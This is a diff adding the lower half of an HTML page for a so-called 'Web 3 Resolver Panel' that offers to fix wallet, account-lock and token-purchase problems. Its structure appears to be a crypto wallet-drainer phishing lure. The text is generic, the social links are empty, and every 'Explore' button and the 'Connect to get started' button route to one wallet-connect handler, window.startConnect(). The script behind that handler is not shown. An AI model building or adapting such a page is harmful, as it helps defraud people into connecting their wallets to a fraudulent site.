+                                    <p>Click here for issues related to account lock.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>Trading Wallet Issues</h4>
+                                    <p>
+                                        Click here if you have problem with your trading
+            wallet.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Unable To Buy Coins/Tokens</h4>
+                                    <p>
+                                        To trade crypto your account must be marked as a
+            trusted payment source.
+                                    </p>
+                                    <a class="interact-button interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Other Issues Not Listed</h4>
+                                    <p>
+                                        If you can't find the issue you are experiencing click
+            here.
+                                    </p>
+                                    <a class="interact-button interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="intro-video section-padding bg-light triangle-top-light triangle-bottom-light" style="background-color: rgb(0, 0, 0);">
+                        <div class="container">
+                            <div class="row justify-content-center">
+                                <div class="col-xl-8">
+                                    <div class="section-title text-center">
+                                        <h2>Get Started Now</h2>
+                                        <p>
+                                            Discover the difference that Web 3 Resolver Panel can make in resolving a diverse range
+              of
+              blockchain, cryptocurrency, and DeFi issues. Get started today!
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row justify-content-center">
+                                <div class="col-xl-8">
+                                    <div class="intro-video-content text-center mt-5 ">
+                                        <a class="connect-modal-trigger btn btn-primary px-4 interact-button interactbutton">
+                                            Connect to
+              get
+              started
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bottom section-padding triangle-top-dark triangle-bottom-dark" style="background-color: rgb(0, 0, 0);">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
+                                    <div class="bottom-logo">
+                                        <img class="pb-3" src="2695c647628d29316cbe4e06c172e6a4669274a3.png" alt="">
+                                        <p>
+                                            Our commitment is to address a wide array of blockchain and crypto challenges
+              comprehensively. We strive to provide effective solutions that empower you to navigate
+              the
+              rapidly evolving blockchain landscape with confidence. Trust us to optimize your
+              operations
+              and create a successful and efficient blockchain ecosystem.
+                                        </p>
+                                    </div>
+                                </div>
+                                <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
+                                    <div class="bottom-widget">
+                                        <h4 class="widget-title">Quick Links</h4>
+                                        <ul>
+                                            <li>
+                                                <a class="interact-button interactbutton">Explore</a>
+                                            </li>
+                                            <li>
+                                                <a onclick="window.startConnect()" class="connectButton">Connect</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="footer" style="background-color: rgb(0, 0, 0);">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-xl-6 col-lg-6 col-md-6 interact-button col-sm-6 col-12">
+                                    <div class="copyright">
+                                        <p>
+                                            © Copyright 2024
+                                            <a class="interactbutton"></a>
+                                            All Rights Reserved
+                                        </p>
+                                    </div>
+                                </div>
+                                <div class="col-xl-6 col-lg-6 col-md-6 interact-button col-sm-6 col-12">
+                                    <div class="footer-social">
+                                        <ul>
+                                            <li>
+                                                <a class="interactbutton">
+                                                    <i class="bi bi-facebook"></i>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a class="interactbutton">
+                                                    <i class="bi bi-twitter"></i>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a class="interactbutton">
+                                                    <i class="bi bi-linkedin"></i>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a class="interactbutton">
+                                                    <i class="bi bi-youtube"></i>
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
